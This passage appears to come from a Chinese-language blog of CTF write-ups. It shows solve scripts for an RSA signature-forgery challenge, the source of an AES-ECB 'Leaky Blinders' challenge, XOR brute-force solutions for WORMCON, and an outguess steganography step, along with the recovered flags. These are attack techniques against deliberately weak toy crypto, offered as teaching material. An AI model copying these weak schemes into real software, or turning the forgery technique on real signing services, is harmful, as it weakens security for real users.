task <span class="token operator">=</span> FactorDB<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
m1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>task<span class="token punctuation">[</span><span class="token string">'factors'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">int</span><span class="token punctuation">(</span>task<span class="token punctuation">[</span><span class="token string">'factors'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
m2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>task<span class="token punctuation">[</span><span class="token string">'factors'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
c1 <span class="token operator">=</span> getc<span class="token punctuation">(</span><span class="token punctuation">)</span>

chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
c2 <span class="token operator">=</span> getc<span class="token punctuation">(</span><span class="token punctuation">)</span>

chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token punctuation">(</span>c1 <span class="token operator">*</span> c2<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
getc<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># b' > Signed command: SCTF&#123;Mult1pLic4tiv3_pr0perty_of_RSA&#125;\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="corCTF"><a href="#corCTF" class="headerlink" title="corCTF"></a>corCTF</h1><h1 id="FwordCTF"><a href="#FwordCTF" class="headerlink" title="FwordCTF"></a>FwordCTF</h1><h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h3 id="Leaky-Blinders"><a href="#Leaky-Blinders" class="headerlink" title="Leaky Blinders"></a>Leaky Blinders</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3.8</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad<span class="token punctuation">,</span> unpad
<span class="token keyword">import</span> sys<span class="token punctuation">,</span> os

FLAG <span class="token operator">=</span> <span class="token string">b"FwordCTF&#123;###############################################################&#125;"</span>

WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
Welcome to Enc/Dec Oracle.
'''</span>

key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">^</span> b<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        msg <span class="token operator">=</span> pad<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> xor<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> key<span class="token punctuation">)</span>
    <span class="token keyword">return</span> cipher


<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>
    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>k<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> xor<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> k<span class="token punctuation">)</span>
    msg <span class="token operator">=</span> unpad<span class="token punctuation">(</span>aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> msg


<span class="token keyword">class</span> <span class="token class-name">Leaky_Blinders</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"Here is the encrypted flag : </span><span class="token interpolation"><span class="token punctuation">&#123;</span>encrypt<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n1- Encrypt"</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2- Decrypt"</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"3- Leave"</span><span class="token punctuation">)</span>
                c <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>

                <span class="token keyword">if</span> c <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
                    msg <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
                    cipher <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token builtin">all</span><span class="token punctuation">(</span>a <span class="token operator">!=</span> b <span class="token keyword">for</span> a<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    <span class="token keyword">else</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Something seems leaked !"</span><span class="token punctuation">)</span>

                <span class="token keyword">elif</span> c <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>
                    k <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\nKey : "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    cipher <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Ciphertext : "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    flag <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> k<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token string">b"FwordCTF"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Well done ! Here is your flag : </span><span class="token interpolation"><span class="token punctuation">&#123;</span>FLAG<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                    <span class="token keyword">else</span><span class="token punctuation">:</span>
                        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">"Wrong key."</span><span class="token punctuation">)</span>

                <span class="token keyword">elif</span> c <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>
                    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">"Goodbye :)"</span><span class="token punctuation">)</span>

        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">"System error."</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    challenge <span class="token operator">=</span> Leaky_Blinders<span class="token punctuation">(</span><span class="token punctuation">)</span>
    challenge<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="W-amp-M-CTF"><a href="#W-amp-M-CTF" class="headerlink" title="W&amp;M CTF"></a>W&amp;M CTF</h1><h2 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc"></a>Misc</h2><h3 id="你画我猜"><a href="#你画我猜" class="headerlink" title="你画我猜"></a>你画我猜</h3><p>只会画伞 &amp; 篮球，hhh。</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210829192958380.png" alt></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">WMCTF&#123;x1aoma0_wants_a_girlfriend&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="WORMCON-CTF"><a href="#WORMCON-CTF" class="headerlink" title="WORMCON CTF"></a>WORMCON CTF</h1><h2 id="前言-6"><a href="#前言-6" class="headerlink" title="前言"></a>前言</h2><p>我丢，还没复现几个题目比赛网站打不开了，真是太糙了，之后复现一定要及时。</p>
<h2 id="Cryptography-1"><a href="#Cryptography-1" class="headerlink" title="Cryptography"></a>Cryptography</h2><h3 id="RoboXOR"><a href="#RoboXOR" class="headerlink" title="RoboXOR"></a><strong>RoboXOR</strong></h3><p>给出题目与提示</p>
<pre class="line-numbers language-none"><code class="language-none">Rick got a robot named &quot;XORius&quot; as a gift by his parents which activates with a key, in user manual it was written - &quot;we suggest you to use your name is X factor for ROBO ^_^&quot; so Rick followed the user manual, his bot was working fine and now started saying &quot;2506110631060d103c5a15582036045b3c075734640015580d10531e0d1c134a2f&quot;

But now Rick has fear of his parents and he wants your help to understand his ROBO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>根据题意，说明书上写的是他的名字是x factor，将名字的位数按照密文的位数进行扩展再异或获得flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

c <span class="token operator">=</span> <span class="token number">0x2506110631060d103c5a15582036045b3c075734640015580d10531e0d1c134a2f</span>
name <span class="token operator">=</span> <span class="token string">b"Rick"</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span><span class="token string">b'R'</span>
Name <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>Name <span class="token operator">^</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># wormcon&#123;n3v3r_g0nn4_6iv3_y0u_up!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Exclusive"><a href="#Exclusive" class="headerlink" title="Exclusive"></a><strong>Exclusive</strong></h3><pre class="line-numbers language-none"><code class="language-none">SO EXCLUSIVE. MUCH ELITE. SUCH WOW.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>给出的脚本如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> os


<span class="token keyword">def</span> <span class="token function">splitit</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>n <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> key1<span class="token punctuation">,</span> key2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    m<span class="token punctuation">,</span> l <span class="token operator">=</span> splitit<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
    e <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m <span class="token operator">^</span> key1<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>l <span class="token operator">^</span> key2<span class="token punctuation">)</span>
    <span class="token keyword">return</span> e


FLAG <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'wormcon&#123;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span>
alpha <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'</span>

<span class="token keyword">assert</span> <span class="token builtin">all</span><span class="token punctuation">(</span>x <span class="token keyword">in</span> alpha <span class="token keyword">for</span> x <span class="token keyword">in</span> FLAG<span class="token punctuation">)</span>

otp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
otpm<span class="token punctuation">,</span> otpl <span class="token operator">=</span> splitit<span class="token punctuation">(</span>otp<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>otp <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
cipher <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        enc <span class="token operator">=</span> encrypt<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">,</span> otpm<span class="token punctuation">,</span> otpl<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        enc <span class="token operator">=</span> encrypt<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">,</span> otpl<span class="token punctuation">,</span> otpm<span class="token punctuation">)</span>
    cipher<span class="token punctuation">.</span>append<span class="token punctuation">(</span>enc<span class="token punctuation">)</span>

cipher <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cipher <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cipher = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>cipher<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个加密的运算应该是<code>可逆的（类似并复杂于一般的异或操作）</code>，很简单就可以分析出来，这里采用最简单的验证法来试试。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os


<span class="token keyword">def</span> <span class="token function">splitit</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>n <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> key1<span class="token punctuation">,</span> key2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    m<span class="token punctuation">,</span> l <span class="token operator">=</span> splitit<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
    e <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m <span class="token operator">^</span> key1<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>l <span class="token operator">^</span> key2<span class="token punctuation">)</span>
    <span class="token keyword">return</span> e

otp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
otpm<span class="token punctuation">,</span> otpl <span class="token operator">=</span> splitit<span class="token punctuation">(</span>otp<span class="token punctuation">)</span>
c <span class="token operator">=</span> encrypt<span class="token punctuation">(</span><span class="token number">520</span><span class="token punctuation">,</span> otpm<span class="token punctuation">,</span> otpl<span class="token punctuation">)</span>
m <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>c<span class="token punctuation">,</span> otpm<span class="token punctuation">,</span> otpl<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>

c <span class="token operator">=</span> encrypt<span class="token punctuation">(</span><span class="token number">1314</span><span class="token punctuation">,</span> otpl<span class="token punctuation">,</span> otpm<span class="token punctuation">)</span>
m <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>c<span class="token punctuation">,</span> otpl<span class="token punctuation">,</span> otpm<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后就只是对这个<code>otp = int(os.urandom(1).hex(), 16)</code>产生的key进行一个简单的爆破就行了。下面是爆破的脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> os


<span class="token keyword">def</span> <span class="token function">splitit</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>n <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> key1<span class="token punctuation">,</span> key2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    m<span class="token punctuation">,</span> l <span class="token operator">=</span> splitit<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
    e <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>m <span class="token operator">^</span> key1<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>l <span class="token operator">^</span> key2<span class="token punctuation">)</span>
    <span class="token keyword">return</span> e


alpha <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'</span>
cipher <span class="token operator">=</span> <span class="token string">'a1adabc2b7acbbffb5ae86fee8edb1aeabc2e8a886a986f5e9f0eac2bbefeaeaeaf986fee8edb1aeab'</span>


<span class="token comment"># otp = int(os.urandom(1).hex(), 16) 随机数范围为 0~256</span>


<span class="token keyword">for</span> key <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    otpm<span class="token punctuation">,</span> otpl <span class="token operator">=</span> splitit<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    flag <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            enc <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>ch<span class="token punctuation">,</span> otpm<span class="token punctuation">,</span> otpl<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            enc <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>ch<span class="token punctuation">,</span> otpl<span class="token punctuation">,</span> otpm<span class="token punctuation">)</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">all</span><span class="token punctuation">(</span>i <span class="token keyword">in</span> alpha <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'worncon&#123;'</span><span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span>
<span class="token comment"># worncon&#123;x0r_n1bbl3_c1ph3r_15_4_h0m3_br3w3d_c1ph3r&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">worncon&#123;x0r_n1bbl3_c1ph3r_15_4_h0m3_br3w3d_c1ph3r&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="DASCTF八月挑战赛"><a href="#DASCTF八月挑战赛" class="headerlink" title="DASCTF八月挑战赛"></a>DASCTF八月挑战赛</h1><h2 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到-3"><a href="#签到-3" class="headerlink" title="签到"></a>签到</h3><p>直接签到就ok了。</p>
<h3 id="寒王’sblog"><a href="#寒王’sblog" class="headerlink" title="寒王’sblog"></a>寒王’sblog</h3><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;hanwang2333.gitee.io&#x2F; 你滴寒王写了blog，看看寒王不小心留下了什么信息？<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210831135753095.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">outguess -k &quot;hahahahahahaha&quot; -r flag.jpg out.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210831141140777.png" alt></p>
<p>意料之中，flag.jpg就是他的头像，直接运行上面的命令得flag</p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;50aa7fe02602264e7d8102746416cd74&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210831141503166.png" alt></p>
<h2 id="Crypto-2"><a href="#Crypto-2" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h3><p>比赛原题</p>
<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/22374">https://ctftime.org/writeup/22374</a></p>
<p>那第一种解题思路来想。</p>
